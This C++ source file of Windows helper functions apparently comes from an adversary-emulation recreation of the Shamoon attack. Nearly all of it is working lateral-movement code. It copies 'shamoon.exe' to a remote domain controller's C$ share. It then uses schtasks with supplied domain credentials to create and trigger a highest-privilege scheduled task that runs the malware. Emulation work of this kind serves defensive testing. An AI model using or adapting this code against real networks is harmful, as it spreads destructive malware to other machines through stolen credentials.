#include "helpers.h"

#include <iostream>
#include <string>

#include <windows.h>
#include <processthreadsapi.h>  // CreateProcessA
#include <errhandlingapi.h>     // GetLastError

using namespace std;

/*
 * Returns the user associated with the current context.
 */
string GetCurrentUser() {
    char user_name[256];
    DWORD dw_user_name = 256;
    GetUserNameA(user_name, &dw_user_name);
    return string(user_name);
}

/*
 * Checks if the current process is elevated. Returns false if not.
 * Sources:
 *  - https://stackoverflow.com/a/8196291
 */
bool CurrentProcessIsElevated() {
    bool is_elevated = FALSE;
    HANDLE process_token = NULL;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &process_token)) {
        TOKEN_ELEVATION elevation;
        DWORD return_length = sizeof(TOKEN_ELEVATION);
        if (GetTokenInformation(process_token, TokenElevation, &elevation,
                                sizeof(elevation), &return_length)) {
            is_elevated = elevation.TokenIsElevated;
        }
    }
    if (process_token) { CloseHandle(process_token); }
    return is_elevated;
}

/*
 * Copies malware to remote machine. Returns false if copying fails.
 */
bool CopyShamoonToDC(const char* kTargetMachine) {
    const char* kLocalFile = "shamoon.exe";
    string file_name = static_cast<string>("\\\\") + kTargetMachine + "\\C$\\Windows\\System32\\" + kLocalFile;

    if (!CopyFile(kLocalFile, file_name.c_str(), false)) { return false; }
    Sleep(5000);
    return true;
}

/*
 * Creates the scheduled task in a separate process.
 * Returns false if task creation failed.
 */
bool CreateScheduledTask(const char* kUsername, const char* kPassword,
                         const char* kDomainName, const char* kTargetMachine) {
    // Create scheduled task on specified system.
    string create_task_command_str = static_cast<string>("schtasks.exe /Create /S \"") + kTargetMachine;
    // Name the task.
    create_task_command_str += static_cast<string>("\" /TN \"shamoonNPCImpersonation\" ");
    // Specify path and filename of task to run.
    create_task_command_str += static_cast<string>("/TR \"\'\\\\") + kTargetMachine + "\\C$\\Windows\\System32\\shamoon.exe\' ";
    // Command line args for shamoon.exe.
    create_task_command_str += kUsername + static_cast<string>(" \'") + kPassword + "\' " + kDomainName + " " + kTargetMachine;
    // Specify user/password for context task should run under.
    create_task_command_str += static_cast<string>("\" /U \"") + kDomainName + "\\" + kUsername + "\" /P \"" + kPassword;
    // Specify event that should execute task. Run with highest privileges.
    create_task_command_str += "\" /SC ONEVENT /EC Application /MO *[System/EventID=777] /RL HIGHEST /F";
    LPSTR create_task_command = const_cast<char *>(create_task_command_str.c_str());
    STARTUPINFOA startup_info;
    PROCESS_INFORMATION process_information;
    ZeroMemory(&startup_info, sizeof(STARTUPINFO));
    ZeroMemory(&process_information, sizeof(PROCESS_INFORMATION));

    return CreateProcessA(
        NULL,
        create_task_command,
        NULL,
        NULL,
        true,
        0,
        NULL,
        NULL,
        &startup_info,
        &process_information);
}

/*
 * Runs the event associated with the scheduled task in a separate process.
 * Returns false if process creation fails.
 */
bool RunScheduledTaskEvent(const char* kUsername, const char* kPassword,
                           const char* kDomainName, const char* kTargetMachine) {
    // Run the task on the target machine.
    string run_event_command_str = static_cast<string>("schtasks.exe /Run /S \"") + kTargetMachine + "\" ";
    run_event_command_str += "/TN \"shamoonNPCImpersonation\" ";
    // Specify user credentials to run with.
    run_event_command_str += static_cast<string>("/U \"") + kDomainName + "\\" + kUsername + "\" /P \"" + kPassword + "\"";
    LPSTR run_event_command = const_cast<char *>(run_event_command_str.c_str());
    STARTUPINFOA startup_info;
    PROCESS_INFORMATION process_information;
    ZeroMemory(&startup_info, sizeof(STARTUPINFO));
    ZeroMemory(&process_information, sizeof(PROCESS_INFORMATION));

    return CreateProcessA(
        NULL,
        run_event_command,
        NULL,
        NULL,
        true,
        0,
        NULL,
        NULL,
        &startup_info,
        &process_information);
}

/*
 * Creates and executes a privileged scheduled task.
 * Returns false if task registration or event execution fails.
 * Sources:
 *  - https://serverfault.com/a/769309
 */
bool CreateAndRunScheduledTask(const char* kUsername, const char* kPassword,
                               const char* kDomainName, const char* kTargetMachine) {
    cout << "[+] Creating the scheduled task" << endl;
    bool task_was_created = CreateScheduledTask(
        kUsername,
        kPassword,
        kDomainName,
        kTargetMachine);
    if (!task_was_created) {
        cout << "[!] ERROR: Task creation Failed: " << GetLastError() << endl;
        return task_was_created;
    }

    Sleep(5000);

    cout << "[+] Running the scheduled task event" << endl;
    bool task_was_run = RunScheduledTaskEvent(
        kUsername,
        kPassword,
        kDomainName,
        kTargetMachine);
    if (!task_was_run) {
        cout << "[!] ERROR: Attempt to run task Failed: " << GetLastError() << endl;
        return task_was_run;
    }
    return task_was_created && task_was_run;
}

/*
 * Copies malware to remote machine. Creates and runs scheduled task.
 * Returns 0 if successful, -1 otherwise.
 */
int ExecuteShamoonOnRemoteMachine(const char * kUsername, const char * kPassword,
                                  const char * kDomain, const char * kTargetMachine) {
    cout << "[+] Attempting privileged write of Shamoon to target server" << endl;
    if (!CopyShamoonToDC(kTargetMachine)) {
        cout << "[!] ERROR: CopyShamoonToDC() failed: " << GetLastError() << endl;
        return -1;
    }
    cout << "[+] CopyShamoonToDC() succeeded" << endl;

    if (!CreateAndRunScheduledTask(kUsername, kPassword, kDomain, kTargetMachine)) {
        cout << "[!] ERROR: CreateAndRunScheduledTask() failed" << endl;
        return -1;
    }
    cout << "[+] shamoonNPCImpersonation task was scheduled on remote machine" << endl;
    return 0;
}
